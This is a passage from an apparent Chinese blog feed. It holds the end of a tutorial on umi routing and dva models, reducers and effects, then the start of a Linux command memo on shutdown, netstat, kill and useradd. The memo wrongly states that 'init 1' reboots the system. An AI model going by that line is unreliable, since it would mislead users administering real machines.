// 约定的全局样式文件，自动引入，也可以用 global.less</span><br><span class="line">    ├── global.js                  // 可以在这里加入 polyfill</span><br><span class="line">    ├── app.js                     // 运行时配置文件</span><br><span class="line">├── .umirc.js                      // umi 配置，同 config/config.js，二选一</span><br><span class="line">├── .env                           // 环境变量</span><br><span class="line">└── package.json</span><br></pre></td></tr></table></figure><h2 id="1-3-路由"><a href="#1-3-路由" class="headerlink" title="1.3 路由"></a>1.3 路由</h2><p>umi 的核心在于组织路由，只要创建的文件符合规范就可以自动生成路由。</p><p>详情请查询 <a href="https://umijs.org/zh/guide/router.html#%E7%BA%A6%E5%AE%9A%E5%BC%8F%E8%B7%AF%E7%94%B1">官方文档</a></p><p>首先要创建应用的基础样式，文件存放于 <code>/src/layouts</code> 路径下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入 css module</span></span><br><span class="line"><span class="keyword">import</span> styles <span class="keyword">from</span> <span class="string">&#x27;./index.css&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">BasicLayout</span>(<span class="params">props</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&#123;styles.normal&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">h1</span> <span class="attr">className</span>=<span class="string">&#123;styles.title&#125;</span>&gt;</span>Yay! Welcome to umi!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;props.children&#125; &#123;/*插入子路由*/&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">BasicLayout</span>;</span><br></pre></td></tr></table></figure><p>单个页面的样式可以在 <code>/src/pages</code> 下创建，如我们想要访问 <code>http://yourwebsite.com/list</code> 就在 <code>pages</code> 文件夹下创建一个 <code>list</code> 目录，以及一个 <code>index.js</code> 文件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>list<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>页面之间的跳转可以引入 <code>Link</code> 声明式路由组件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Link</span> <span class="keyword">from</span> <span class="string">&#x27;umi/link&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> () =&gt; (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">Link</span> <span class="attr">to</span>=<span class="string">&quot;/list&quot;</span>&gt;</span>Go to list page<span class="tag">&lt;/<span class="name">Link</span>&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>同时还可以引入 <code>router</code> 方法来进行命令式导航：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">&#x27;umi/router&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> styles <span class="keyword">from</span> <span class="string">&#x27;./index.css&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">backHome</span>(<span class="params"></span>) &#123;</span><br><span class="line">  router.<span class="title function_">push</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">className</span>=<span class="string">&#123;styles.btn&#125;</span> <span class="attr">onClick</span>=<span class="string">&#123;backHome&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      List</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="2-DVA"><a href="#2-DVA" class="headerlink" title="2. DVA"></a>2. DVA</h1><blockquote><p>dva 目前是纯粹的数据流，和 umi 以及 roadhog 之间并没有相互的依赖关系，可以分开使用也可以一起使用</p></blockquote><p><img src="http://img.cdn.esunr.xyz/markdown/20191207152816.png" alt="Dva 中的数据流"></p><h2 id="2-1-开启-DVA"><a href="#2-1-开启-DVA" class="headerlink" title="2.1 开启 DVA"></a>2.1 开启 DVA</h2><p>dva 是基于 redux redux-saga 和 react-router 的轻量级前端框架。</p><p>umi 对 dva 进行了整合，可以直接在配置文件 <code>config.js</code> 设置引入：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">    [<span class="string">&#x27;umi-plugin-react&#x27;</span>, &#123;</span><br><span class="line">      <span class="attr">dva</span>: <span class="literal">true</span></span><br><span class="line">    &#125;]</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-2-创建-Model-层-（State）"><a href="#2-2-创建-Model-层-（State）" class="headerlink" title="2.2 创建 Model 层 （State）"></a>2.2 创建 Model 层 （State）</h2><blockquote><p>dva 通过 model 的概念把一个领域的模型管理起来，包含同步更新 state 的 reducers，处理异步逻辑的 effects，订阅数据源的 subscriptions 。</p></blockquote><p><img src="http://img.cdn.esunr.xyz/markdown/20191206184557.png" alt="数据分层的概念"></p><p>按照 UMI 规范，我们应该在 <code>/src/models</code> 下创建 Model 层的数据，每个数据层单独存放在一个 <code>.js</code> 文件下，并拥有一个独立的 namespace 进行区分，如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">namespace</span>: <span class="string">&#x27;list&#x27;</span>,</span><br><span class="line">  <span class="attr">state</span>: &#123;</span><br><span class="line">    <span class="attr">data</span>: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">    <span class="attr">maxNum</span>: <span class="number">3</span>, </span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="2-3-连接-Model-到组件中-（connect）"><a href="#2-3-连接-Model-到组件中-（connect）" class="headerlink" title="2.3 连接 Model 到组件中 （connect）"></a>2.3 连接 Model 到组件中 （connect）</h2><blockquote><p><code>connect</code> 方法继承与 React-Redux</p></blockquote><p>有了 Model 层的数据之后，我们就不需要在组件内使用 state 来存放数据。调用 Model 层的数据首先需要从 <code>dva</code> 引入 <code>content</code> 装饰器：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; connect &#125; <span class="keyword">from</span> <span class="string">&#x27;dva&#x27;</span>;</span><br></pre></td></tr></table></figure><p>之后按照命名空间，来讲数据作为组件的 <code>props</code> 传入组件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_">connect</span>(<span class="function"><span class="params">state</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">data</span>: state[namespace].<span class="property">data</span>,</span><br><span class="line">    <span class="attr">maxNum</span>: state[namespace].<span class="property">maxNum</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">List</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在组件内对数据进行调用：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">props</span>.<span class="property">data</span>);</span><br></pre></td></tr></table></figure><p>除此之外可以按照传统的用法而不使用装饰器用法，使用 <code>connect</code> 方法将组件与 state 数据关联，注意这样做的话，当前返回的不是组件，而是 <code>connect</code> 方法的返回值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">connect</span>(<span class="function">(<span class="params">state</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="comment">/* ... ... */</span> &#125;</span><br><span class="line">&#125;)(<span class="title class_">List</span>)</span><br></pre></td></tr></table></figure><h2 id="2-4-修改-Model-层的数据-（Reducer）"><a href="#2-4-修改-Model-层的数据-（Reducer）" class="headerlink" title="2.4 修改 Model 层的数据 （Reducer）"></a>2.4 修改 Model 层的数据 （Reducer）</h2><p><img src="http://img.cdn.esunr.xyz/markdown/20191207164324.png" alt="同步数据的数据流图"></p><p>首先要在 Model 层设置一个 Reducer 函数，一个 Reducer 函数接收两个参数，分别为 state 和 action。可以用来直接修改 state 中的数据。</p><blockquote><p>Reducer 函数返回一个新的 state 来与原来的 state 进行 <strong>覆盖操作</strong>，也就是说如果返回的 state 如果缺少某一项，会导致数据丢失。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// listData.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">namespace</span>: <span class="string">&#x27;list&#x27;</span>,</span><br><span class="line">  <span class="attr">state</span>: &#123;</span><br><span class="line">    <span class="comment">// ... ...</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">reducers</span>: &#123;</span><br><span class="line">    <span class="attr">addNewData</span>: <span class="keyword">function</span>(<span class="params">state, action</span>) &#123;</span><br><span class="line">      <span class="keyword">let</span> maxNum = state.<span class="property">maxNum</span> + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">let</span> newArr = [...state.<span class="property">data</span>, maxNum];</span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">data</span>: newArr,</span><br><span class="line">        maxNum,</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>之后在组件中，使用 dva 提供的 <code>connect</code> 装饰器的第二个参数掺入的函数，可以拿到 <code>dispatch</code> 方法，调用 <code>dispatch</code> 方法可以派发一个 <strong>Action</strong> 从而调用一个 <strong>Reducer 函数</strong>，同时要注意结合 namespace 命名空间调用：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// list.jsx</span></span><br><span class="line">@<span class="title function_">connect</span>(</span><br><span class="line">  <span class="function"><span class="params">state</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="comment">// ... ...</span></span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="function"><span class="params">dispatch</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="title function_">add</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> action = &#123; </span><br><span class="line">          <span class="attr">type</span>: <span class="string">`<span class="subst">$&#123;namespace&#125;</span>/addNewData`</span> </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_">dispatch</span>(action); </span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br><span class="line">)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">List</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设置好派发 <code>dispatch</code> 的方法后，方法就被挂载到组件的 <code>props</code> 中了，在组件中调用就可以使用：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">props</span>.<span class="title function_">add</span>()</span><br></pre></td></tr></table></figure><h2 id="2-5-使用-mapStateToProps-与-mapDispatchToProps"><a href="#2-5-使用-mapStateToProps-与-mapDispatchToProps" class="headerlink" title="2.5 使用 mapStateToProps 与 mapDispatchToProps"></a>2.5 使用 mapStateToProps 与 mapDispatchToProps</h2><p>两个方法我们可以在外部定义，然后再传入到装饰器内，这样就能更清晰的显示代码调理：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// list.jsx</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">mapStateToProps</span> = (<span class="params">state</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">data</span>: state[namespace].<span class="property">data</span>,</span><br><span class="line">    <span class="attr">maxNum</span>: state[namespace].<span class="property">maxNum</span>,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">mapDispatchToProps</span> = (<span class="params">dispatch</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="title function_">add</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="comment">// 派发一个 listData 中的 addNewData 方法</span></span><br><span class="line">      <span class="title function_">dispatch</span>(&#123; <span class="attr">type</span>: <span class="string">`<span class="subst">$&#123;namespace&#125;</span>/addNewData`</span> &#125;); </span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_">connect</span>( mapStateToProps, mapDispatchToProps )</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">List</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-6-异步数据的处理"><a href="#2-6-异步数据的处理" class="headerlink" title="2.6 异步数据的处理"></a>2.6 异步数据的处理</h2><blockquote><p>Dva 的异步能力继承与 Redux-Saga</p></blockquote><p><img src="http://img.cdn.esunr.xyz/markdown/20191207164413.png" alt="异步数据的数据流图"></p><p>Model 对象上的 effect 属性里可以写入 Generator 函数来进行异步数据的获取。创建的 Generator 函数内可以获取到两个参数，分别为 <code>action</code> 和 <code>sagaEffects</code> 对象。</p><p>其中 <code>sagaEffects</code> 对象下存在两个方法，<code>call()</code> 方法用于执行异步数据的获取，<code>put()</code> 方法用于派发一个 Action 来更新 state 中的数据。</p><p>关于 <code>call()</code> 方法，我们可以不使用 <code>call()</code> 方法而直接去 <code>yield</code> 获取一个异步方法得到的数据，但是按照规范我们必须使用 <code>call()</code> 来包裹一个异步方法，其官方解释如下：</p><blockquote><p>call 创建了一条描述结果的信息，就像在 Redux 里你使用 action 创建器，创建一个将被 Store 执行的、描述 action 的纯文本对象，call 创建一个纯文本对象描述函数调用。redux-saga middleware 确保执行函数调用并在响应被 resolve 时恢复 generator。这让你能容易地测试 Generator，就算它在 Redux 环境之外。因为 call 只是一个返回纯文本对象的函数而已。</p></blockquote><p>UMI 为开发者很好的提供了一个 mock 环境，可以直接在项目的 <code>/mock/</code> 路径下创建 js 文件写入 mock 数据，如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mockListData.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="string">&#x27;get /api/list&#x27;</span>: <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123;</span><br><span class="line">      <span class="attr">listData</span>: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>],</span><br><span class="line">      <span class="attr">maxNum</span>: <span class="number">4</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>有了数据流之后，就可以使用 AJAX 来获取数据。在 <code>effects</code> 中我们来编写一个 Generator 函数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> request <span class="keyword">from</span> <span class="string">&#x27;../utils/request&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">namespace</span>: <span class="string">&#x27;list&#x27;</span>,</span><br><span class="line">  <span class="attr">state</span>: &#123;</span><br><span class="line">    <span class="comment">// ... ...</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">reducers</span>: &#123;</span><br><span class="line">    <span class="comment">// ... ...</span></span><br><span class="line">    <span class="title function_">addNewData</span>(<span class="params">state, action</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (action.<span class="property">payload</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> newState = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(state));</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Object</span>.<span class="title function_">assign</span>(newState, action.<span class="property">payload</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// ... ...</span></span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">effects</span>: &#123;</span><br><span class="line">    *<span class="title function_">fetchData</span>(<span class="params">action, &#123; call, put &#125;</span>) &#123;</span><br><span class="line">      <span class="comment">// request 是从外部引入的 XHR 封装的方法</span></span><br><span class="line">      <span class="keyword">const</span> data = <span class="keyword">yield</span> <span class="title function_">call</span>(request, <span class="string">&#x27;/api/list&#x27;</span>, &#123; <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span> &#125;);</span><br><span class="line">      <span class="comment">// 使用 put() 方法来派发一个 action</span></span><br><span class="line">      <span class="keyword">yield</span> <span class="title function_">put</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&#x27;addNewData&#x27;</span>,</span><br><span class="line">        <span class="attr">payload</span>: data,</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>与 Reducer 函数一样，Effect 函数也可以通过派发一个 Action 来调用，但 Effect 函数不会主动修改 State 中的数据，而是在获取了数据之后另外生成一个 Action 来调用直接修改数据的 Reducer 函数。</p><blockquote><p>Effect 函数只是拦截了 Action 然后进行了数据的转发</p></blockquote><p>在调用时，我们也需要利用 <code>connect</code> 来获取 <code>dispatch</code> 方法来调用一个 Effect 函数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_">connect</span>(</span><br><span class="line">  <span class="function"><span class="params">state</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="comment">// ... ...</span></span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="function"><span class="params">dispatch</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="comment">// ... ...</span></span><br><span class="line">      <span class="title function_">fetchData</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">dispatch</span>(&#123;</span><br><span class="line">          <span class="attr">type</span>: <span class="string">`<span class="subst">$&#123;namespace&#125;</span>/fetchData`</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br><span class="line">)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">List</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法调用：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">props</span>.<span class="title function_">fetchData</span>()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux指令备忘录</title>
      <link href="/2019/12/9a94fb35a3ad.html"/>
      <url>/2019/12/9a94fb35a3ad.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-系统相关"><a href="#1-系统相关" class="headerlink" title="1. 系统相关"></a>1. 系统相关</h1><h3 id="关机与重启"><a href="#关机与重启" class="headerlink" title="关机与重启"></a>关机与重启</h3><p>关机指令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shutdown </span><br><span class="line"> [-t] 在改变到其它runlevel之前﹐告诉init多久以后关机。</span><br><span class="line"> [-r] 重启计算器。</span><br><span class="line"> [-k] 并不真正关机﹐只是送警告信号给每位登录者〔login〕。</span><br><span class="line"> [-h] 关机后关闭电源〔halt〕。</span><br><span class="line"> [-n] 不用init﹐而是自己来关机。不鼓励使用这个选项﹐而且该选项所产生的后果往往不总是你所预期得到的。</span><br><span class="line"> [-c] cancel current process取消目前正在执行的关机程序。所以这个选项当然没有时间参数﹐但是可以输入一个用来解释的讯</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">halt </span><br><span class="line">halt = shutdown -h</span><br><span class="line">[-n] 防止<span class="built_in">sync</span>系统调用﹐它用在用fsck修补根分区之后﹐以阻止内核用老版本的超级块〔superblock〕覆盖修补过的超级块。</span><br><span class="line">[-w] 并不是真正的重启或关机﹐只是写wtmp〔/var/log/wtmp〕纪录。</span><br><span class="line">[-d] 不写wtmp纪录〔已包含在选项[-n]中〕。</span><br><span class="line">[-f] 没有调用shutdown而强制关机或重启。</span><br><span class="line">[-i] 关机〔或重启〕前﹐关掉所有的网络接口。</span><br><span class="line">[-p] 该选项为缺省选项。就是关机时调用poweroff。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">init</span><br><span class="line">init 0为关机﹐init 1为重启</span><br></pre></td></tr></table></figure><p>重启指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure><h3 id="查看端口占用"><a href="#查看端口占用" class="headerlink" title="查看端口占用"></a>查看端口占用</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ntulp | grep 3306 //查看所有3306端口使用情况</span><br></pre></td></tr></table></figure><h3 id="删除进程"><a href="#删除进程" class="headerlink" title="删除进程"></a>删除进程</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">kill</span> -9 pid</span><br></pre></td></tr></table></figure><h1 id="2-账号相关"><a href="#2-账号相关" class="headerlink" title="2. 账号相关"></a>2. 账号相关</h1><h3 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo useradd [Options] UserName</span><br></pre></td></tr></table></figure><p>其中各选项含义如下：</p><p>-c comment 指定一段注释性描述。<br>-d 目录 指定用户主目录，如果此目录不存在，则同时使用-m选项，可以创建主目录。<br>-g 用户组 指定用户所属的用户组。<br>-G 用户组，用户组 指定用户所属的附加组。<br>-s Shell文件 指定用户的登录Shell。<br>-u 用户号 指定用户的用户号，如果同时有-o选项，则可以重复使用其他用户的标识号。</p><p>为用户添加密码：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd UserName</span><br></pre></td></tr></table></figure><p>通常 <code>useradd</code> 指令创建一个新用户需要对新用户进行各种初始化设置，如果不想手动设置，可以使用 <code>adduser</code> 指令快速添加一个新用户：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo adduser UserName</span><br></pre></td></tr></table></figure><h3 id="用户组群"><a href="#用户组群" class="headerlink" title="用户组群"></a>用户组群</h3><p>创建组：</p><figure 